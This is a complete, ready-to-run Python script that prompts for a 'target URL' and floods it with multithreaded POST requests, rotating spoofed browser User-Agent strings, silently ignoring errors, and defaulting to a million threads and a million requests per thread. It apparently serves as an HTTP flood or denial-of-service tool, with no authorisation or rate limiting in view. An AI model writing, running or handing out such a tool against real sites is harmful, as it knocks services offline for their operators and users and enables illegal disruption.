import requests
import threading
import time

# User agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36"
]

# Request function
def request_func(url, num_requests):
    for i in range(num_requests):
        try:
            headers = {"User-Agent": user_agents[i % len(user_agents)]}
            response = requests.post(url, headers=headers)
            if response.status_code == 200:
                print(f"Request {i+1} was successful.")
        except:
            pass

# Main function
def main(url, num_threads, num_requests):
    start_time = time.time()
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=request_func, args=(url, num_requests))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print(f"\nFinished in {time.time() - start_time:.2f} seconds.")

# Inputs
url = input("Enter the target URL: ")
num_threads = int(input("Enter the number of threads: "))
if num_threads == 0:
    num_threads = 1000000
num_requests = int(input("Enter the number of requests per thread: "))
if num_requests == 0:
    num_requests = 1000000

# Call main function
if __name__ == "__main__":
    main(url, num_threads, num_requests)
